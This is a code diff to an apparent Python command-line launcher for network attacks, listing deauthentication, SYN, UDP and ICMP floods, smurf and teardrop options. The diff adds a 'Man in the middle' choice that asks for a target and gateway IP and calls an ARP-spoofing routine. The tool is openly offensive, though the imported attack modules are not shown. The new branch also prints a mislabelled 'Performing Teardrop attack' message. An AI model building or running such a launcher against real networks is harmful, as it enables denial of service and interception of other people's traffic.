@@ -2,7 +2,8 @@ import Scripts.Deauther as Deauther, \
 Scripts.SYNFlooder as SYNFlooder, \
 Scripts.UDPFlooder as UDPFlooder, \
 Scripts.ICMPFlooder as ICMPFlooder, \
-Scripts.Smurf as Smurf, Scripts.Teardropper as Teardropper
+Scripts.Smurf as Smurf, Scripts.Teardropper as Teardropper, \
+Scripts.ArpBan as ArpBan
 
 def intInput(q):
     while True:
@@ -25,6 +26,7 @@ def list_choice(choices=list()):
     4) Smurf attack
     5) Deauthentication
     6) Teardrop
+    7) Man in the middle
 
     Please input a number
     """
@@ -90,3 +92,13 @@ if __name__ == "__main__":
         
         print("Performing Teardrop attack")
         Teardropper.attack(target_ip=target_ip)
+
+    elif choices[0] == 6:
+        print("Insert target IP")
+        target_ip = input(">> ")
+
+        print("Insert gateway IP")
+        gateway_ip = input(">> ")
+        
+        print("Performing Teardrop attack")
+        ArpBan.ArpSpoof(target_ip=target_ip, spoof_ip=gateway_ip)
